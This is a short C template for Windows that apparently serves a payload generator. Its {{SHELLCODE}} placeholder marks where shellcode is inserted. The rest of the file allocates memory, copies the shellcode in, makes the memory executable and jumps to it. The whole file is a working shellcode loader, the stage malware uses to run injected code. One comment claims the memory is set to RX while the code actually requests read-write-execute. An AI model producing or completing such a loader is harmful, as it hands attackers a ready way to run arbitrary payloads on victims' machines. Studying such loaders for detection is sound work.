#include <windows.h>
#include <stdio.h>


int main(void)
{
	DWORD result;
	{{SHELLCODE}}
	
	// Allocate memory for the shellcode RW
    char *dest = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, PAGE_READWRITE);
	if (dest == NULL) {
		return 1;
	}

	// Copy the shellcode to the allocated memory
	memcpy(dest, shellcode, sizeof(shellcode));

	// Change memory protection to RX
	if (VirtualProtect(dest, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &result) == 0) {
		return 2;
	}

    // Execute *dest
    (*(void(*)())(dest))();
	
	return 0;
}
